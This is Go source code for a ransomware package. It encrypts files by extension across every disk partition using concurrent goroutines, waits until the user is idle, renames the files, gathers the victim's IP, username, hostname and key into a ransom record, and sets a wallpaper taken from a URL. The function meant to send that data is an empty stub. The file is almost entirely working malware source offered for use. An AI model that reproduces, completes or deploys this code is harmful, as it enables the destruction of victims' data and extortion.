package ransomware

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	go_grab_ip "github.com/PaulDotSH/go-grab-ip"
	"github.com/PaulDotSH/go-idle-info"
	"github.com/reujab/wallpaper"
	"github.com/shirou/gopsutil/disk"
	"io"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

type RansomData struct {
	IPData       go_grab_ip.IPData
	Key          string
	Username     string
	ComputerName string
	UUID         string
}

var CurrentRansomData RansomData

//TODO: make encryption_windows and encryption_other

func Encrypt(key, data []byte) []byte {
	c, err := aes.NewCipher(key)

	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	return gcm.Seal(nonce, nonce, data, nil)
}

func Decrypt(key, data []byte) []byte {
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	decrypted, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return decrypted
}

// Encrypts the file without checking first if the extension isn't "extension" or in the ext list/dict
func EncryptFileWoExtChecking(path string, key []byte) error {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		//Think of a fix, if the error isn't nil the walk function exits, so we return nil even on errors
		fmt.Println(err)
		return nil
	}

	data = Encrypt(key, data)
	err = ioutil.WriteFile(path, data, 0644)
	if err != nil {
		err = ChangePerms(path)
		if err != nil {
			fmt.Println(err)
			return nil
		}
	}

	var sb strings.Builder
	sb.WriteString(path)
	sb.WriteString(extension)
	err = os.Rename(path, sb.String())
	fmt.Println(err)
	return nil
}

func EncryptFile(path string, key []byte) error {
	if strings.HasSuffix(path, extension) {
		return nil
	}

	//Check if the current's file extension is in the dict or list
	if UseDict {
		if extensionDict[GetFileExtensionFastest(path)] != 1 {
			return nil
		}
	} else {
		Len, Extension := len(extensionsSlice), GetFileExtensionFastest(path)
		ok := 0
		for i := 0; i < Len; i++ {
			if extensionsSlice[i] == Extension {
				ok = 1
			}
		}
		if ok == 0 {
			return nil
		}
	}

	return EncryptFileWoExtChecking(path, key)
}

func DecryptFile(path string, key []byte) error {
	//Do not decrypt anything that doesn't have the specific extension
	if !strings.HasSuffix(path, extension) {
		return nil
	}

	data, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Println(err)
		return nil
	}
	data = Decrypt(key, data)
	err = ioutil.WriteFile(path, data, 0644)
	if err != nil {
		fmt.Println(err)
		return nil
	}

	err = os.Rename(path, strings.TrimSuffix(path, extension))
	fmt.Println(err)
	return nil
}

func RecursivelyEncryptDirectory(startingPath string, key []byte) error {
	return filepath.Walk(startingPath, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() {
			return nil
		}
		//TODO: Check file size
		return EncryptFile(path, key)
	})
}

func RecursivelyDecryptDirectory(startingPath string, key []byte) error {
	return filepath.Walk(startingPath, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() {
			return nil
		}
		return DecryptFile(path, key)
	})
}

func EncryptPathsConcurrently(paths []string, key []byte) {
	var wg sync.WaitGroup
	for _, path := range paths {
		wg.Add(1)

		path := path //because of how concurrency works, to make sure  everything is alright
		go func() {
			defer wg.Done()
			err := RecursivelyEncryptDirectory(path, key)

			if err != nil {
				fmt.Println(err)
			}
		}()
	}
	wg.Wait()
}

func DecryptEveryPartition(key []byte) {
	var wg sync.WaitGroup
	partitions, _ := disk.Partitions(false)
	for _, partition := range partitions {
		wg.Add(1)
		go func() {
			defer wg.Done()
			var err error
			if runtime.GOOS == "windows" {
				err = RecursivelyDecryptDirectory(partition.Mountpoint+"\\", key)
			} else {
				err = RecursivelyDecryptDirectory(partition.Mountpoint, key)
			}
			if err != nil {
				fmt.Println(err)
			}
		}()
	}
	wg.Wait()
}

// EncryptEveryPartition for each partition, launch a new routine and wait for all to complete
//because the ransomware will recursively run on /, it will on any partition anyway but not concurrently, think of a way to skip checking already encrypted paths that
//doesn't affect performance
func EncryptEveryPartition(key []byte) {
	var wg sync.WaitGroup
	partitions, _ := disk.Partitions(false)

	go_idle_info.AwaitIdleTime(WaitAfk)

	for _, partition := range partitions {
		wg.Add(1)

		go func() {
			defer wg.Done()
			var err error
			//this might get optimised by the compiler
			if runtime.GOOS == "windows" {
				err = RecursivelyEncryptDirectory(partition.Mountpoint+"\\", key)
			} else {
				err = RecursivelyEncryptDirectory(partition.Mountpoint, key)
			}

			if err != nil {
				fmt.Println(err)
			}
		}()
	}
	wg.Wait()

	CreateMessage()
}

//Starts the ransomware, respecting all settings from settings.go
func Start() {
	_, e := go_grab_ip.GetIPData()
	//No internet
	if e != nil {
		if !WaitForInternet { //only do this if there is no internet and wait for internet is false
			Key = StaticKey
			encryptAndSendKey()
			return
		}
	}

	//set ransom data variable
	CurrentRansomData.UUID = UUID
	CurrentRansomData.IPData = go_grab_ip.AwaitIPData()
	CurrentRansomData.Key = Key

	o, _ := user.Current()
	CurrentRansomData.Username = o.Username
	hostname, _ := os.Hostname()
	CurrentRansomData.ComputerName = hostname

	encryptAndSendKey()
	if WallpaperUrl != "" {
		//we don't care about the error since we wont be able to do anything with it anyway
		fmt.Println(wallpaper.SetFromURL(WallpaperUrl))
	}
}

func encryptAndSendKey() {
	if SendKeyAtStart {
		SendRansomData()
		EncryptEveryPartition([]byte(Key))
	} else {
		EncryptEveryPartition([]byte(Key))
		SendRansomData()
	}
}

func SendRansomData() {
	// use the endpoint we defined
}
